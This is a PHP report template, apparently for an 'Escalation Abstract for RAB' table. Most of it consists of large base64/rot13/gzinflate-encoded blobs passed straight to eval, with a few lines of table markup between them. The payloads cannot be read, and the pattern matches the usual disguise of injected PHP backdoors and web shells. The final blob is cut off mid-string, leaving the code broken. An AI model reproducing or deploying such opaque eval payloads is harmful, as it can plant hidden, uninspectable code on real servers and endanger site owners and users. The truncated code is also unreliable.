	eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

	?>
	<?php echo $table; ?>
	<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor="#FFFFFF" id="table1">
	<?php echo $tablehead; ?>
	<?php 
	echo "<tr style='background-color:#EEEEEE;' class='labelprint'><td colspan='12' align='center' class='labelbold'>Escalation Abstract for RAB - ".$Crbn."</td></tr>";
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
	
	
	
	for($i=0;$i<count($subdivisionlist);$i++)
	{
eval(str_rot13(gzinflate(str_rot13(base64_decode('LUzFruxZkn6aSffszKBMlZmZNyMzM/vp2z7/XJ0rSLnszGdxxAeRWD3c/9n6I17voVz+Mw7FgiH/Ny9GMi//yYemyu////JiTJ1gK4kcy5J1BS6SzrmnWI4YQTBCYkwmd4RiMOUOIA/xf042XNvPyr4f0uKWrN/2fk1H+7esaVmy6Pnb4F5t+vG9DOKkMOwyXTFakQu06BJtqW2zYCPtzsTWfhTu/PCWlLCYbd+DzuFNErV1+i9VB0L8qCGsr68x1YrNFrD4uuoE5+OWgRe4H4pNFKVFUpffzKsamM/hZVwkTU1oACI1IafLAj2AG7xwAaF0xdEKufGV3dPelpWklD+Elw/FOQGS9AV/OHob7owIXuop6ACsziglzAhKHRda13hMBbUgEX+3HwbFO+IiTVuO/6iGhBAGqewZ++nNTS6D3l2qquIKQP80mgPh8z5tbDd3dEsFXUx5zNOSYHvup3jzvXzHQS0hZQzsDdb6jvvjTt/o72B/Aqnr4qp70MyiajJT1XgBgmtt74Mi0kYj/f2kU3YE3SphkA4K3+8FFzU3tZPxbeNXWwyznctxOA1+1kEwnSkqNDqzzXmXU2LWKFFqkXcQbOXcPcpvR8zXTi/mmIP5SFPW72PKxNTGtgbGvTKzpfrvJQzBy9OBV8dUpvp3tJUAfoMNGtD7o55OYclFgwvHiKnfHqtre68jwS4s6Py8r7aDHRvSAf17IgB+79837Fojvd3fgQMOgIHBxyCc4ybUFEtkAlPeqOuVui/9EJC0Lrdwa2KvAytvyPeROWmfFIJ7h+M8Sr8049B1xunLW8z1aAN7742qQZZI/LhoV/PYAbogl+kYMKglLSXudysbGaoTgTtTeRZ66U9u3oCmV4wTzZiy4QfSD9ozj8YSF6TpbaTw+mzTsbtVDesS/xcqsgzvyruWCipkkMHkalMq2fuwmLU6B2Bl2KQ9eAnu94V0q2xu03MT938ub1X682YBTZRAoftMzVoPWKWfXMZBkeO58ExAsCALmbrn6MUj1CxLtvuOZRK2mhIXnfWbGGN9zjzde9Vcq1cCUFjUE75y3gUNxF3LwB08Epe400gG0ZxouKnQZIVfYXO5W26z1qkSYtrZF3ohvwViFtGTWvFbKgPrD3azYZIn2rkXQZ7+tn1FFefNwp2wmMV3yl+7J28MLR2Z2+CbL/p1yOgtcw1poFPlyy7ov0yqBwgatXz9YZuna2Nc09StKu71g9JaK1iExU/DA3UqJlTrmIwN2YQRPf3Kg8+SDDUw/in6PhKpOVQeGRc+RS/YawUyb5jsWw76w2Z3Be8CB7thiHFcGv6l1GV+9dTv+w/vAcHEik+GyAasCNe9cUZNGp0R2EMJYlFWys5u7jb+0lIJznkQXdmul8W238jaP5xjOAlZHOL9ki9JEQ8+WF2OIYXtDeMurS+etIN74Oof1mvvf1yBOS9+YrdGekU2+2wamAOOPrZ4xVxSAdwOnMqPvEj4JoortljzQFcTPM9a4H1XgCKqBTaevfZtIjGkEJTqg13FgqGazXlch/IQBDUvzoCUSQnip76TujS5k3NCeZPMNNpcUU0hJzjEkU6pCXJ+IL0na2THqtGb7PoL2jrSAkS5fYVr636w8w03yrdp/pXY3mxSnsLR8kF5paBoJZrzlRz6wQKRM9AhLTf+eUJekTLm5r2rA88d2Uw/yKd6AQVnBVfqeUwrT4uakuYar3fiZFckV8AKw7uKcd3jujpbBRtrUgvZcPwVvIux75dwZwuXG+DSSYMr7g/qPmeLZipkCXNbf+0khqEXuV/mo7vLWiWGTC6nIxLoia1QLkCtDJFcmhjY8agTZHRDG5jPH4d5c0IB38I3Ugaxyx+KwqPqddyT5uf3af7yEwwRsTXlrBK8+aWKfx7MS/X2MbQp/e2QeB3pOYyBmkNjPESzcRaydm9ClOziDn5LXrlOxiwhYWVJunC/Heiwt55/K2NX79R8927pCpfLly2/fA6Cq8Ge59Gf3bpvVvsQUtroQaH98cbfwk5EP5FqbDyP6a0R4Fx+DSlxtTDMsPWl3aztJOEtddjrO+QGO8K1Gus9FSdx3ji6sU7cUnM6PCrhvZ4M2BgYGQ3eTd4c1BzmMWvlh0XfyAW1m0VIQY0Wa4K7c/KOrYUYCwnsNma2SejPNJMNwdeqLumwC+aMmb/3NIiwRJhVjN5CweoNkrwE2bdDYb/M5XTlllYAe2eTiq7NGR5iC/G6xFgmrLuV3jIX3UIKOeNnd7eL50VO12pYCiK9fUkTBLBXZzIXSWGY0TGXwmry+sqr5b8o6oySJVXaPzaCVMG84yxUErTX88+3uf6V2H6ULDAdw8EtggCLlnPbfvtfIOrskSErp5H66pDlxSN0dYHOTHheZO68y18hb5dD0RNQd8H2hlm6rliDSXakFNXSp2MQOGMzoEBhn0Hd1YKmvV534V2cPu3S7dQS5RZ7VIwQL+r5qVdsppRyhkW9DN9Y20FZyMuP0Yup4CQigw6SHW+7OesK/zO0651gOwgy2ywnt5M6c9Fi4fIY4fmPaAuzvcbf1m/xJEw5rpPbxGFG+NWQI3IWKTkKbGTvA9AKWGQ2uHwUlryPRiAwE1heeF3KVQyCFAz+bnMsLc6MW+z30iFXzdRTQqAQqKSZ8GpvaA6LgRFy0h51AVtYDuZg4t3Lz5PJVjGPVAzwlaNw0f0cj+2V4hcw0eQUzch7TH1EYzdskY0CYNkRVX5cJBDgQ+eboZFHyeyoL43oEiZWcLieQQOMCYk5zXfwQSirHRCa/Kh8SjLHN+5trrr4hZbuS56aojrTS+kzVcwyTCVnl92Xr81xcX2AntKiFxfmJwNuBP5xq+B+1CDHshLcLaM/481nrBdoNxmu/RFBAc8UI73w2xpaC7gNNJ0PRtk0g0JQmu9nHGwZaePbOFS2uQUvwBZ/qSAKLz3bJ9dj1GhzTC7VmhZGHGAAfEPeVxVxgUTN5s/HYZs9l7HpqKzHiCGr+ZK2rg473UL4ltDj6fRMLyOKjLq0y9xeo7kTCRubeEWFonM/BmaCDounDuA35ceC64n4Xf963RprhqUwr74GJp9rRGSsHm5S5WojpFkyU2cgNfLOauD8Pd0n5z9xenlYFIPtis0n/TKGXJ83eMZRKUD0TGZa9n6y+BLS705kvFN7EzwJhJBFACUOE5tTsozO69IaBhD4BOkMEGo+Nt0HEZSAucKN+4TJygkgsxCMt5ieWvl3N+nqZZh0eAmn5VE1SQXb1WT07sezZRQzlU68lJlzOcN60362tTvtuHBl+ybEubvpdmbAs0udU9vfMVpd3LwukHnbzdje5Lf3ezC1gAVjjqhmx2QVPSW8HgbT8EMXpH3+iMXkQGpn5bXYeqqYLr8ckys0Wnzo6EoKJbXOPV1mrBg6af6xecf7CC4IAiNdU8UxtxqMCr+fkkt3IAVUw5decQqKltZ8MncnGhldCaHaPuL0jdayI1W+Zddk9eppYzqLfjputz6p0YVwFtupXRLa15QEROM3l2ihDwcXdYmF39DekYkAqz/3Go0D71Ca2TEUa6IWObjrgLnQqbdxY5tGbmuBfNDnZmWBIidUGyaFAacuNzPPhKHgDhBtOnBzXLKDrksIcbPbdocqewNr1m3lTWM2ezGTG5wB3Ab4JceJ6AWR/CiWzSo6ZJmZYt+qhcYZ08fbAeMxAEEzESNdQAPFy0iaduslENpflF9WSi5INQRQ6asBklH9JU26kVVdUNsg0y+5kZZdEbCJsEHGz9nBgtZpDI2iHzy/c/U4ZngZ2nRVfwOzYMMhN5Y8wmYdkxYndQApMH7F47FgkLKtucFIwghRi74Rv7IoiWsCGDKHXXYoIlxQc6PujLfu5Wx6rPfEZZpb/F2k4I1Py3uH6a58QYMkyhArybKImnYP77FsFNUCYRWN+5mPuk56ObYbqyFHCSB2H5i1rxo/xQu4Y9N/HM60wQGFBgkiC5rH0vdbq0okeLCA1MeS8QClN595YYj7neDzOio7yM9x2PWEbi7ETCZ2Kn8cpPtgDHQ+mbFpRE3D+eo0TXirJy2/KQk54eZKfu5f6SqS7zUCioKMW2BF9/BKK8mld15hy5QBbcmzQOQBV8N7J6gR9On2A2/nXylqA/EHB22++U1KG36249NXiwjTJwwQwD5hL2VWIxxK9o0PpwBvo44JTV84jN0Gn+RcMcddm0p2gC2HaCxwh9ByTogKPBPMNTlW82g1BnE3vGlBjnPxk2hL5uTJQ90YxfPxaapb00wfcsQ7zHhK3uZdMIeawgNTSMYRoWeqHp//LPREO44KUOj3VzgR4F8DtMOXTPlVRTHmuf5lO/oU4lpKxJKZ9P3kGvp0b4/SfafWX4LVbvFGbvYdx5s57Gv/XoqYx3e2eRJCShRgzrrYgR4JNeV/ApTXqphpUi59TM2t5nAMA2f4UXxw7TYghD6XFPC5Pf/egvpOBLEFT+gsBgc2w0Jbm1vqZvKxrgT/zat94lo9jgy59vBcVZgYJBmvQQivVoW3KLW2+N71Jl9S+vaDeBc7Xjz5WRqS7wlFNYub73WYk7Hf2AYmempTEXg8HUHrtxBa3xZCJjb0R9iULYGVitWrDvc5w8/XdYT+ME+JCVy/fnw2K2s1ydqbEmpFRl3JOCdqRX/zcFLo8hBxBt6h1Raq3kQSr0va1ofV1kvEUDRxDk2Yw18BaCuAxvd9mTCWsfxu8+/mYeSwlwd0gJUBTSPqNmtw/MSKsejshU7NKwQBRw8CkBclZFUKwGycXo+jS0qNMrNiC8uc4NJtVAdNLDjOsDpFs8clEGhyW5FwrlxHoGXpEp7g65BH3sXgMDmNPv0lRbKIn8n5CU8IOFBdha9NbU659de8Iiq+J1FJUOCnxAq2Ze6ZAQncYrzLQdFDGjuI6khGOvq1s+bjE/9F/UWVQjMDsEhPyR1HMzuD0Ry4cNu6JkRpQcM1W0MmmtG58Q/Bd+fqcu5bDSsZvMT+RCMMfcYbKsAskNXhsUMvBIGH7AXMlP9sCEXEIKcMf2K+lkZyqJN5FcOcY1FDrQqTRExwx4m9kergxcIgD/GXWccCElesvsRaxq76GZ0vzQh9KdOeRg50C3+iMnNOEPZnMsBf71LTc5aXEiFVDHalXLvz8lRcKZYRN1QCy1918nsW4Z9pEkqTqQYH2j+kGWgF2xAGSBpw1w1bKnHUNffpQ9dT4MCcDxBgraKvt4XvKS0EXBDEUAnNVjxcgOLUsud9V4y5/NQ3k5UoyMWu/WQAjyyOSYB5pTuo27ZBdJVdX2g2gt8LkhkKctGKup3juXja8/q+fOF38DZEOiT0J9BSoWhMIuz5kW+RHbI19SVnr5tq6MKe30BrNWI5PO+eTHz+mfyV6pRV+yQL14iuSPntkFVO0N9rMH7BDzSktX6f1k+dShz+abrHoen+dpYCe4sbUMav60N48vQ12fp+j5YhJcRCrFBCUd46A6V4cNShAxZSR2MMew/IaDCOM00aMNX0Ovt09lovzQvHy8TPGYLJYCwh2prAqaYiP4zAdh2hvQzV3ZA2zNBQ97i6TUDjYJDIEQS+lPCveDdyj4On0bmcywKzf+2dUymKUglTcUzWuC3Tr42m3iKrigkUqmfGf6BK6kYb+287eJeQ4GWCWKXGx8rrh/mKSqr+N8vLISIQtfqDcAS/FQoD3sOpDVITi80yRbBBuZ+3nJhUIvpyRFQv2DJC9JmJD/XFwlPQsBb0XSxjlwJgsqCnAYcNL+/tfaqZKzLin1ZpD+5S6Xmu470ZFMuubRK1R8Fw8/l1tyI2n5LS7t6WUuH7ddMPWOxdS0VfEoRwEff5ynJgO9y2Mdyte9a50g8znxIJBA7x+tXEW+Uya/qNU40Kdau5dGGb8l50VFy+KhkSM2woyIBObPpmmtFUk+E5HxnBUTjpH+SjtmkXpC8wzJ+jQhKznswd+gjlxltTZfRf2EevG+Nh5dROBqq3sx75m8WBn8TI7VEdO2Rci4bpgjDHQyHs81dxJdO85pP27dKAMYErhSagqFZBsTV3Zozo13cFSbN8nY1aqpYYGF3Ds94wZp9LLMLMITyFmfkcucY1nbDP9lEp7/DKZJXbmbAIyL0Iu2oomvXbY63M5x1AYhUyDikV9+sc0uqnOOxLo+7NOthkrnfSAn6lQQhw9m2A668PpKvDW5Sz6Ps/0CyO2r+2NVbkb+sAlsR